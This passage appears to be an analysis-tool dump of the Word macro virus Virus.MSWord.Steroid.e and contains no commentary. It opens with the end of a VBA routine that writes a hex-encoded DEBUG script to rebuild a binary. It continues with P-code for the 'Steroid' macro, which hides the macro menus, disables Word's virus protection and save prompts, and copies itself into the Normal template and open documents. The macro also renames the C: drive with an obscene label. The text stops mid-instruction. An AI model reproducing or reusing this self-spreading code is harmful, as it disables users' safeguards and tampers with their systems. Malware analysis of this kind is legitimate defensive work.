Print #hFile, "E CC80 9C A8 B4 B8 C4 D0 9F A8 B5 A7 B0 BD D2 DE EA C0"
Print #hFile, "E CC90 CC D8 75 83 8F 99 A9 B5 C7 D9 E4 7C 8D 96 D0 DC"
Print #hFile, "E CCA0 E2 DC E7 EB BF CA CE CC D8 DC C3 CF D5 C1 CE D6"
Print #hFile, "E CCB0 E4 F4 FB EA FB FF D3 E3 EF CA DB E8 C1 D4 E3 B8"
Print #hFile, "E CCC0 CC DD 97 AB BD 5E 74 86 52 68 7A 71 87 99 85 94"
Print #hFile, "E CCD0 A7 94 A2 B5 98 A6 B9 84 92 A5 69 77 8A 55 63 76"
Print #hFile, "E CCE0 47 54 6A 3E 4B 61 3C 49 5F 38 45 5B 35 41 59 3E"
Print #hFile, "E CCF0 4A 62 4D 59 71 53 5F 77 5C 67 82 6D 78 93 76 81"
Print #hFile, "E CD00 9C 76 82 9A 79 85 9D 8A 97 AD A1 AE C4 AC BA CD"
Print #hFile, "E CD10 B4 C2 D4 C1 D0 E0 AD BC CC 94 A3 B3 6D 7D 8A 4B"
Print #hFile, "E CD20 5B 68 7F 8F 9B CA DA E6 BD CD D9 98 A8 B5 C9 D8"
Print #hFile, "E CD30 E8 E5 F4 FF D6 E3 F1 99 A9 B6 86 96 A2 8E 9E AB"
Print #hFile, "E CD40 84 93 A3 85 93 A5 8C 9A B0 90 9E B5 88 95 AF 7F"
Print #hFile, "E CD50 8E A8 81 8F A6 7A 8B A0 72 81 94 69 77 89 47 52"
Print #hFile, "E CD60 60 5A 63 6D 7D 86 90 8A 93 9C 8A 91 9A 91 99 A0"
Print #hFile, "E CD70 8E 97 9B 86 8F 92 77 80 84 B6 BF C2 E2 EB EF EA"
Print #hFile, "E CD80 F5 F9 D9 E2 E6 AD B7 BE 86 90 97 67 73 79 7E 8A"
Print #hFile, "E CD90 8E 83 8E 92 87 8D 92 84 88 8D 7E 82 87 00 02 07"
Print #hFile, "E CDA0 00 00 F9 FA F6 E9 EA E6 DB DF DA D0 D4 CF C3 C8"
Print #hFile, "E CDB0 C6 B3 B8 B6 00 02 01 F8 FE FD EF F7 F7 F6 FF FF"
Print #hFile, "E CDC0 ED F6 FA A5 B0 B4 BD C8 CC AD B7 BE CE D8 DF F3"
Print #hFile, "E CDD0 FF FF 9E AD B6 52 63 6C B5 C3 CF EA F9 FF B2 C0"
Print #hFile, "E CDE0 CC 91 9D A7 B1 BD C9 BC C6 D0 7F 88 95 A8 B2 BC"
Print #hFile, "E CDF0 DC E8 F4 B6 C2 CC 76 84 90 C6 D5 DE ED FD FF 82"
Print #hFile, "E CE00 92 99 E9 F4 F8 F1 FA FD DF E8 EB F4 FF FF C7 D2"
Print #hFile, "E CE10 D6 8F 9B A1 B3 C1 C7 DD ED F4 E1 F2 FB E1 F3 FE"
Print #hFile, "E CE20 D9 EC F9 CA DF EE C5 D9 EA BD D3 E5 9A B0 C2 6A"
Print #hFile, "E CE30 80 92 57 66 79 4A 58 6B 4B 59 6C 5B 69 7C 57 65"
Print #hFile, "E CE40 78 3E 4C 5F 30 3D 53 34 41 57 3D 4A 60 4A 57 6D"
Print #hFile, "E CE50 43 4F 67 2D 39 51 24 30 48 2E 3A 52 46 52 6A 61"
Print #hFile, "E CE60 6C 87 77 82 9D 7E 89 A4 85 91 A9 93 9F B7 9D A9"
Print #hFile, "E CE70 C1 93 A0 B6 8A 98 AB 91 9F B1 6F 7D 8F 6A 79 89"
Print #hFile, "E CE80 6E 7D 8D A4 B4 C1 C7 D7 E4 A8 B8 C4 AB BB C7 E0"
Print #hFile, "E CE90 F0 FC EF FC FF DC E9 F9 9E AB B9 83 90 9E 84 92"
Print #hFile, "E CEA0 9E 7A 8A 97 88 97 A7 9A A8 BA 9E AC C2 91 9F B6"
Print #hFile, "E CEB0 84 93 AD 90 9E BA 8F 9E B8 7C 8B A5 7C 8C A3 83"
Print #hFile, "E CEC0 92 A5 78 85 95 85 91 9D 90 99 A6 86 90 9A 87 90"
Print #hFile, "E CED0 9A 8C 95 9E 88 90 97 90 98 9F 88 90 97 83 8D 94"
Print #hFile, "E CEE0 AF B9 C0 CE D8 DF 97 A2 AA 6F 7A 82 7C 87 8F 74"
Print #hFile, "E CEF0 81 89 72 7E 82 76 82 84 77 7E 81 85 8A 8D 83 88"
Print #hFile, "E CF00 8B 00 00 03 00 00 F7 FB F6 EA EE E9 DF E2 E0 D3"
Print #hFile, "E CF10 D6 D4 BC C1 BF B2 B7 B5 00 01 00 FA FF FF F9 FE"
Print #hFile, "E CF20 FF F8 FF FF E3 EA ED 92 9B 9E AF B8 BB F2 FB FF"
Print #hFile, "E CF30 D9 E4 E8 C7 D3 D9 6F 7F 86 6C 7E 85 D7 E6 EF DB"
Print #hFile, "E CF40 E8 F0 DC E8 F2 E6 F1 F9 E1 EB F5 D6 DF E8 C0 C9"
Print #hFile, "E CF50 D3 AC B7 BF C7 D3 DD 91 9E A6 88 94 9E E5 F5 FC"
Print #hFile, "E CF60 E0 EF F8 7E 8C 92 9B A7 A9 D5 DF DF F2 FC FC F4"
Print #hFile, "E CF70 FF FF E6 F2 F4 99 A5 A9 AA B8 BE D5 E5 EC DD EE"
Print #hFile, "E CF80 F7 D5 E7 F2 E8 FB FF D3 E8 F7 D2 E7 F6 DF F6 FF"
Print #hFile, "E CF90 DC F3 FF CF E3 F4 C2 D4 E5 B7 C7 D8 A9 B9 CA 9F"
Print #hFile, "E CFA0 AF C0 91 A1 B2 80 90 A1 71 80 93 6B 7A 8D 5F 6E"
Print #hFile, "E CFB0 81 42 51 64 2B 39 4F 30 3E 54 42 50 66 4B 59 6F"
Print #hFile, "E CFC0 4A 58 6E 48 56 6D 5A 67 81 65 72 8C 56 63 7D 50"
Print #hFile, "E CFD0 5E 75 67 75 8C 69 77 8D 55 63 79 52 61 74 5D 6C"
Print #hFile, "E CFE0 7F 8E 9E AF AE BE CE AE BF CC A4 B5 C2 BA CB D8"
Print #hFile, "E CFF0 E0 F2 FD E7 F7 FF C1 CE DE 95 9F B0 9F AA B8 9C"
Print #hFile, "E D000 AA B6 90 9E AA 9B A8 B6 92 A1 B1 91 9F B1 89 97"
Print #hFile, "E D010 AD 8E 9C B3 8D 9C B6 96 A4 C0 8E 9C B8 7B 8A A4"
Print #hFile, "E D020 79 8A A4 7A 8B A0 88 96 A8 8D 9A AA 8E 98 A9 8F"
Print #hFile, "E D030 9A A8 A7 B0 BD A8 B2 BC 8E 97 A1 8B 94 9D 88 91"
Print #hFile, "E D040 9A 7B 84 8D 8B 94 9D 84 8F 97 68 74 7E 6B 7A 83"
Print #hFile, "E D050 76 85 8E 77 87 8E 86 92 96 86 8F 92 8B 90 93 9D"
Print #hFile, "E D060 A0 A4 98 9B 9F 00 00 03 00 00 ED F1 EC F7 FB F6"
Print #hFile, "E D070 E0 E3 E1 CE D1 CF BF C4 C2 B6 BB B9 00 05 04 FB"
Print #hFile, "E D080 FF FF FB FF FF F5 FA FB F3 F8 FB C4 CB CE 8F 96"
Print #hFile, "E D090 99 BC C5 C8 CD D6 DA F0 FC FF 91 A1 A7 8D 9D A4"
Print #hFile, "E D0A0 E9 F6 FE E6 F1 F9 E2 ED F5 F1 FA FF EE F5 FE CB"
Print #hFile, "E D0B0 D2 DB A7 B0 B9 D5 DE E7 EC F7 FF B0 BD C5 DC E9"
Print #hFile, "E D0C0 F1 ED FA FF CE DB E3 6B 77 7D 82 8C 8C EB F3 F2"
Print #hFile, "E D0D0 F8 FF FF F6 FF FF E3 EC EF A2 AE B0 DE EA EE ED"
Print #hFile, "E D0E0 FB FF D6 E6 ED B9 CA D3 D5 E7 F2 DE F2 FD D7 EA"
Print #hFile, "E D0F0 F7 CE E4 F0 C8 DD EC C6 DB EA D1 E1 F1 C5 D5 E5"
Print #hFile, "E D100 B8 C8 D9 AF BF CF A0 B0 C1 86 96 A7 68 78 89 55"
Print #hFile, "E D110 65 76 31 40 53 37 46 59 47 56 69 59 68 7B 5B 69"
Print #hFile, "E D120 7F 53 61 77 4F 5D 73 53 61 77 45 53 6A 50 5E 75"
Print #hFile, "E D130 50 5E 75 4C 5A 71 52 60 77 5D 6B 82 72 80 96 8C"
Print #hFile, "E D140 9A B0 A2 B1 C4 A4 B4 C5 A3 B3 C4 B5 C5 D5 D0 E1"
Print #hFile, "E D150 EE E5 F6 FF DD EF FA B6 C6 D2 8B 96 A4 91 9C AA"
Print #hFile, "E D160 8A 96 A2 86 92 9E 96 A2 AE 99 A7 B3 92 9F AD 90"
Print #hFile, "E D170 9F AF 9F AD C0 8F 9D B3 89 96 B0 90 9F B9 88 96"
Print #hFile, "E D180 B2 82 91 AB 8B 9A B4 85 95 AC 78 87 9A 84 92 A4"
Print #hFile, "E D190 95 A1 B3 97 A4 B4 A1 AA B8 A7 B0 BD A7 AF BC B4"
Print #hFile, "E D1A0 BD C7 9A A3 AD 7B 84 8E 7F 89 93 86 92 9C 7A 86"
Print #hFile, "E D1B0 92 71 7F 8B 6D 7D 89 6F 7E 87 7D 89 8F 8B 94 98"
Print #hFile, "E D1C0 96 9A 9F 8A 8D 92 95 98 9D 00 00 05 00 00 F2 F7"
Print #hFile, "E D1D0 F5 F0 F5 F3 D0 D5 D4 CC D1 D0 C5 C7 C7 B7 B9 B9"
Print #hFile, "E D1E0 00 02 03 F3 F7 F8 F6 FA FB EA EF F0 E7 EC EF D8"
Print #hFile, "E D1F0 DF E2 8F 96 99 BD C6 C9 D5 DE E1 EC F7 FB 7A 88"
Print #hFile, "E D200 8E 89 99 9F E6 F2 F8 EF F9 FF EC F4 FB F6 FE FF"
Print #hFile, "E D210 F8 FE FF E7 ED F4 DF E7 EE F4 FE FF C9 D5 DB AB"
Print #hFile, "E D220 B7 BD F3 FF FF F2 FE FF D6 E2 E8 5C 67 6B 7F 87"
Print #hFile, "E D230 87 EF F7 F6 F6 FE FD F4 FF FD DF E9 E9 A7 B3 B5"
Print #hFile, "E D240 F4 FF FF EF FB FF E1 EF F5 AA BA C1 BB CB D2 DA"
Print #hFile, "E D250 EB F4 DF EF FB DE F0 FB CC DD EA B6 C7 D4 96 A7"
Print #hFile, "E D260 B4 8C 9C A9 85 94 A4 8A 9A A7 8E 9D AD 85 94 A4"
Print #hFile, "E D270 71 80 90 61 70 80 58 66 78 60 6E 80 6E 7C 8E 75"
Print #hFile, "E D280 83 95 6D 7B 8E 60 6E 81 61 6F 82 6C 7A 8D 4D 5A"
Print #hFile, "E D290 70 53 60 76 67 74 8A 73 80 96 66 73 89 5D 6A 80"
Print #hFile, "E D2A0 6D 7A 90 81 8E A4 99 A7 BA B2 C0 D2 CD DB ED E6"
Print #hFile, "E D2B0 F5 FF E8 F8 FF D5 E5 F2 B4 C4 D0 86 96 A2 90 9B"
Print #hFile, "E D2C0 A9 99 A2 B0 79 82 8F 74 80 8A 87 93 9D 8F 9B A5"
Print #hFile, "E D2D0 97 A3 AD 8C 99 A7 8B 97 A9 78 86 99 77 83 9B 83"
Print #hFile, "E D2E0 91 A8 82 8F A9 80 8E A5 87 95 AC 7F 8D A3 7E 8D"
Print #hFile, "E D2F0 A0 81 8F A1 99 A5 B7 A0 AD BD A3 AC BA A8 B1 BE"
Print #hFile, "E D300 A1 A9 B6 9A A2 AF 94 9D A7 8D 96 A0 92 9C A6 8D"
Print #hFile, "E D310 99 A3 81 8D 99 7D 8B 97 7D 8D 9A 81 8F 9B 8B 96"
Print #hFile, "E D320 9E 84 8A 91 8B 8E 96 79 7B 83 7F 81 89 00 00 06"
Print #hFile, "E D330 00 00 F3 F8 F7 EA EF EE DC E1 E0 D0 D5 D4 B9 BB"
Print #hFile, "E D340 BB B2 B4 B4 01 03 04 FC FE FF FB FD FE F6 FA FB"
Print #hFile, "E D350 F0 F3 F7 F5 FA FD D6 DD E0 F2 F9 FC F6 FF FF D8"
Print #hFile, "E D360 E4 E6 6E 7D 80 98 A7 AA E3 ED F4 F3 FC FF F6 FC"
Print #hFile, "E D370 FF F7 FB FF F9 FC FF E5 E9 EE F5 FB FF F6 FF FF"
Print #hFile, "E D380 80 8A 91 AC B8 BC F1 FB FF F4 FF FF D0 DA E1 56"
Print #hFile, "E D390 5F 63 B8 C0 C0 FA FF FF F8 FF FF F8 FF FF EE F6"
Print #hFile, "E D3A0 F6 B8 C2 C2 F6 FF FF F4 FF FF E9 F5 F9 B4 C2 C8"
Print #hFile, "E D3B0 BF CD D3 DE EE F5 DD ED F4 EC FB FF E3 F4 FD CB"
Print #hFile, "E D3C0 DB E7 D3 E1 ED C9 D7 E3 BE CB D9 B9 C7 D3 B7 C4"
Print #hFile, "E D3D0 D2 B5 C2 D0 B1 BE CC AE BB C9 B0 BD CD 9E AB BB"
Print #hFile, "E D3E0 8F 9C AC 8A 97 A7 86 92 A4 82 8E A0 85 91 A3 8D"
Print #hFile, "E D3F0 99 AB 7A 86 98 6B 77 89 75 81 93 8B 97 A9 8E 99"
Print #hFile, "E D400 AD 8E 99 AD 9E A9 BD AC B7 CB D9 E5 F7 E7 F3 FF"
Print #hFile, "E D410 E8 F5 FF DE EB F9 C6 D3 E1 B3 C1 CD A9 B7 C3 93"
Print #hFile, "E D420 9F AB A0 A9 B6 BE C7 D4 B6 C0 CA AC B7 BF AE B9"
Print #hFile, "E D430 C1 A7 B4 BC A6 B3 BB A0 AC B6 91 9C AA 84 90 A2"
Print #hFile, "E D440 7C 87 9B 7E 8B A1 7D 8A A0 74 81 97 71 7E 94 71"
Print #hFile, "E D450 7F 92 70 7E 91 67 75 87 7D 89 9B 89 93 A4 8F 98"
Print #hFile, "E D460 A6 A1 A9 B6 96 9C A9 76 7C 87 8A 90 9B 8E 95 9E"
Print #hFile, "E D470 8F 98 A2 83 8D 97 73 7F 89 6F 7D 89 7B 8B 97 8D"
Print #hFile, "E D480 9B A7 96 9F A9 75 7A 83 7A 7C 86 85 86 90 7B 7C"
Print #hFile, "E D490 86 07 08 12 00 00 EF F4 F5 E5 EA EB DC E0 E1 C4"
Print #hFile, "E D4A0 C8 C9 BC BE BF C4 C6 C7 00 00 03 F6 F7 FB FD FE"
Print #hFile, "E D4B0 FF F9 FC FF FB FE FF FA FF FF F2 F9 FC E1 E8 EB"
Print #hFile, "E D4C0 F2 FB FE B3 BF C1 7E 8B 8D CF DC DE F6 FF FF F8"
Print #hFile, "E D4D0 FF FF FB FE FF FA FD FF F7 FA FF EF F2 F6 F2 F8"
Print #hFile, "E D4E0 FD E3 EC EF 68 71 75 C6 D2 D4 F6 FF FF F6 FF FF"
Print #hFile, "E D4F0 DD E3 E8 7C 83 86 CD D2 D3 FA FF FF F1 F7 F6 F6"
Print #hFile, "E D500 FE FD E4 EC EC A9 B3 B3 EE F7 FA F6 FF FF E8 F4"
Print #hFile, "E D510 F6 B0 BB BF BD C8 CC F2 FE FF E6 F2 F8 E2 EF F7"
Print #hFile, "E D520 EA F7 FF F1 FE FF EB F5 FF EB F5 FF E9 F2 FF E5"
Print #hFile, "E D530 EF F9 E1 EA F7 E1 EA F7 E1 EA F7 E2 EB F8 BA C3"
Print #hFile, "E D540 D1 B0 B9 C7 AD B6 C4 B2 BB C9 B0 B8 C9 A4 AC BD"
Print #hFile, "E D550 99 A1 B2 96 9E AF A1 AA B7 95 9E AB 90 99 A6 93"
Print #hFile, "E D560 9C A9 9B A4 B2 AC B5 C3 BF C7 D8 C8 D0 E1 D0 D8"
Print #hFile, "E D570 E9 D3 DC EA C4 CD DB B4 BD CA AD B7 C1 BE C9 D1"
Print #hFile, "E D580 D4 DF E7 CC D7 DF A9 B1 BE CE D6 E3 C5 CE D8 A6"
Print #hFile, "E D590 B1 B9 C4 D0 D6 CF DB E1 AC B8 BE AE B9 C1 9F A8"
Print #hFile, "E D5A0 B5 90 9B A9 8C 96 A7 8F 9B AD 90 9B AF 8B 97 A9"
Print #hFile, "E D5B0 84 90 A2 84 91 A1 74 81 91 71 7E 8C 86 91 9F 82"
Print #hFile, "E D5C0 8B 98 80 86 93 A4 A8 B3 B6 B8 C2 A6 A8 B2 8C 8E"
Print #hFile, "E D5D0 98 86 89 91 8C 91 9A 9C A3 AC 8B 96 9E 63 6F 79"
Print #hFile, "E D5E0 56 65 6E 69 75 7F 6B 74 7D 59 5E 67 5E 60 6A 7E"
Print #hFile, "E D5F0 7F 89 74 75 7F 00 00 09 00 00 F9 FE FF F8 FD FE"
Print #hFile, "E D600 FB FF FF FB FF FF FD FF FF F1 F3 F4 01 00 04 F5"
Print #hFile, "E D610 F4 F8 FD FE FF F4 F5 F9 FD FE FF FA FD FF FA FF"
Print #hFile, "E D620 FF E8 EF F2 F8 FF FF 97 A0 A3 81 8D 8F E5 F1 F1"
Print #hFile, "E D630 F8 FF FF E9 EE EF EF F0 F4 FC FE FF FD FE FF FB"
Print #hFile, "E D640 FF FF FA FF FF B1 B9 B9 75 7E 81 E4 EE EE F6 FF"
Print #hFile, "E D650 FF F8 FF FF F3 F8 FB 75 7A 7B BD C2 C3 FA FF FF"
Print #hFile, "E D660 F9 FF FE FA FF FF E9 F1 F1 AF B7 B7 F8 FF FF F6"
Print #hFile, "E D670 FF FF F4 FD FF 90 99 9C 80 89 8D E1 EC F0 F4 FF"
Print #hFile, "E D680 FF E5 F0 F4 D2 DC E3 EB F5 FC F6 FD FF F2 F8 FF"
Print #hFile, "E D690 ED F3 FE EC F2 FD EA F0 FB DD E3 EE C2 C8 D5 AB"
Print #hFile, "E D6A0 B1 BE C4 CA D7 C8 CE DB CF D4 E3 D0 D5 E4 C0 C5"
Print #hFile, "E D6B0 D4 AC B1 C0 A9 AE BD B1 B7 C4 C4 CB D4 D5 DD E4"
Print #hFile, "E D6C0 D5 DC E5 BE C5 CE AE B4 BF B2 B8 C3 B7 BD CA B4"
Print #hFile, "E D6D0 BA C7 AA B0 BD C5 CB D8 D0 D6 E3 C8 CE D9 BA C1"
Print #hFile, "E D6E0 CA C0 C8 CF D5 DD E4 D1 D9 E0 A5 AE B8 AE B7 C1"
Print #hFile, "E D6F0 BF C8 D1 BA C4 CB DE EA EE F3 FF FF CA D6 DA BF"
Print #hFile, "E D700 CB CF 9C A7 AF 84 8D 9A 86 8F 9D 90 9A AB 95 9D"
Print #hFile, "E D710 AE 96 A0 B1 91 9B AC 88 93 A1 8C 97 A5 AE BA C6"
Print #hFile, "E D720 E4 ED FA EA F3 FD DF E3 EE EE F0 FA F2 F4 FC E7"
Print #hFile, "E D730 E7 ED D9 D9 DF DC DF E4 E3 E7 EC E6 EC F1 C8 D0"
Print #hFile, "E D740 D7 99 A5 AB 8C 99 A1 98 A3 AB 8D 96 9F 84 8A 91"
Print #hFile, "E D750 7D 80 88 8C 8E 96 7B 7D 85 00 00 06 00 00 F8 FF"
Print #hFile, "E D760 FF F7 FE FF F9 FE FF FB FE FF F8 F9 FD F3 F4 F8"
Print #hFile, "E D770 17 16 1A DA D9 DD FB FA FE F7 F8 FC FD FD FF F9"
Print #hFile, "E D780 FC FF FA FE FF F6 FC FF ED F3 F8 92 9B 9E C2 CE"
Print #hFile, "E D790 CE F4 FF FF F8 FF FF EE F3 F2 F7 F6 F8 FF FF FF"
Print #hFile, "E D7A0 FF FE FF FC FE FE F0 F4 F5 9D A5 A4 A5 AF AF F6"
Print #hFile, "E D7B0 FF FF F7 FF FF F1 F9 F8 E9 EE EF 73 77 78 C4 C9"
Print #hFile, "E D7C0 CA F8 FD FE FA FF FF FA FF FF F5 FA FB CB D0 D1"
Print #hFile, "E D7D0 F9 FE FF F5 FD FD F8 FF FF A6 AD B0 82 89 8C D5"
Print #hFile, "E D7E0 DE E1 F6 FF FF F2 FB FE CC D5 D9 D2 DB DF F2 F8"
Print #hFile, "E D7F0 FF ED F2 FB EA EF F8 EF F4 FD F8 FD FF F3 F8 FF"
Print #hFile, "E D800 DA DE E9 C0 C4 CF F5 F9 FF F0 F4 FF EA ED FB DF"
Print #hFile, "E D810 E2 F0 CC CF DD C3 C6 D4 D3 D6 E4 EA EE F9 E8 EE"
Print #hFile, "E D820 F3 F4 FB FE F2 F8 FD D7 DD E2 BC C2 C9 B7 BC C5"
Print #hFile, "E D830 B9 BD C8 B6 BA C5 D5 D9 E4 E3 E8 F1 E7 EC F5 E4"
Print #hFile, "E D840 EA F1 DB E1 E8 E0 E6 EB EF F5 FA E8 EE F5 BD C3"
Print #hFile, "E D850 CE AF B8 C2 D0 D9 E2 D2 DC E3 D0 DC DE EA F6 F6"
Print #hFile, "E D860 F0 FC FE F4 FF FF B0 BA C1 92 9B A4 8E 96 A3 8F"
Print #hFile, "E D870 98 A6 8E 95 A4 90 99 A7 8A 93 A1 84 8D 9A 7E 87"
Print #hFile, "E D880 94 A2 AB B5 DC E2 ED F3 F8 FF F9 FB FF FD FD FF"
Print #hFile, "E D890 FF FD FF F7 F6 FA FA F9 FD FF FE FF F9 FA FE DE"
Print #hFile, "E D8A0 E3 E6 BE C4 C9 B3 BC C0 C7 D1 D8 D3 DE E2 B1 BA"
Print #hFile, "E D8B0 BE A1 A7 AC 99 9C A1 92 92 98 7E 7E 84 17 17 1D"
Print #hFile, "E D8C0 00 00 F8 FF FF F8 FF FF F9 FE FF FA FF FF F9 FA"
Print #hFile, "E D8D0 FE FD FE FF 00 00 03 06 05 09 00 00 03 00 00 03"
Print #hFile, "E D8E0 00 00 04 00 00 04 00 02 07 00 01 06 00 00 04 00"
Print #hFile, "E D8F0 01 04 00 01 01 00 07 05 00 01 00 01 06 05 03 03"
Print #hFile, "E D900 03 02 00 00 00 00 00 00 01 01 00 04 03 00 01 00"
Print #hFile, "E D910 00 01 00 00 04 02 00 06 05 00 01 00 00 01 00 00"
Print #hFile, "E D920 01 00 00 00 01 00 00 01 00 01 02 00 00 01 05 0A"
Print #hFile, "E D930 0B 00 00 01 00 00 01 00 01 02 00 00 03 00 02 05"
Print #hFile, "E D940 00 00 03 00 06 09 00 00 03 00 07 0A 00 00 03 00"
Print #hFile, "E D950 02 05 00 00 06 00 01 09 00 00 0A 00 00 07 00 00"
Print #hFile, "E D960 07 00 00 08 00 00 09 00 00 08 00 00 09 00 00 08"
Print #hFile, "E D970 00 00 0A 00 00 0D 00 00 0C 00 00 0A 00 00 0A 02"
Print #hFile, "E D980 04 0E 00 02 05 00 01 00 00 00 03 00 04 07 00 00"
Print #hFile, "E D990 06 00 00 06 00 01 0B 00 00 0A 00 00 07 00 00 07"
Print #hFile, "E D9A0 00 00 06 00 02 0A 00 00 04 00 00 04 01 06 09 00"
Print #hFile, "E D9B0 00 04 00 00 0A 00 00 08 00 01 0A 00 00 04 00 01"
Print #hFile, "E D9C0 03 00 04 04 00 01 01 00 01 03 00 05 09 00 00 07"
Print #hFile, "E D9D0 00 00 08 00 00 0A 00 00 0F 00 00 0E 00 00 0A 00"
Print #hFile, "E D9E0 00 0A 00 00 08 00 00 08 00 00 09 00 00 06 00 00"
Print #hFile, "E D9F0 06 04 04 0A 03 00 04 05 01 06 02 00 01 00 00 01"
Print #hFile, "E DA00 00 00 01 01 05 06 00 00 03 00 00 03 00 03 07 00"
Print #hFile, "E DA10 03 07 00 04 07 00 00 03 03 06 0A 00 00 03 04 05"
Print #hFile, "E DA20 09 00 00 03 00 00"
Print #hFile, "RCX"
Print #hFile, "D926"
Print #hFile, "W"
Print #hFile, "Q"
    Close hFile
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Steroid.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Bitch - 429399 bytes
' Line #0:
' 	FuncDefn (Declare Function SetVolumeLabel Lib "kernel32" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long)
' Line #1:
' 	FuncDefn (Sub Steroid())
' Line #2:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #3:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #6:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #7:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #8:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #13:
' 	EndWith 
' Line #14:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #16:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #19:
' 	LitStr 0x000E "c:\startup.log"
' 	LitStr 0x0005 "Bitch"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bitch"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bitch"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #28:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	ArgsCall (Call) Mover2 0x0000 
' Line #30:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #31:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\startup.log"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #32:
' 	EndWith 
' Line #33:
' 	EndWith 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #36:
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #38:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\startup.log"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #39:
' 	EndWith 
' Line #40:
' 	EndWith 
' Line #41:
' 	ArgsCall (Call) Mover1 0x0000 
' Line #42:
' 	LitStr 0x0003 "c:\"
' 	LitStr 0x0005 "Whore"
' 	ArgsLd SetVolumeLabel 0x0002 
' 	St volset 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) out 0x0000 
' 	EndIf 
' Line #45:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
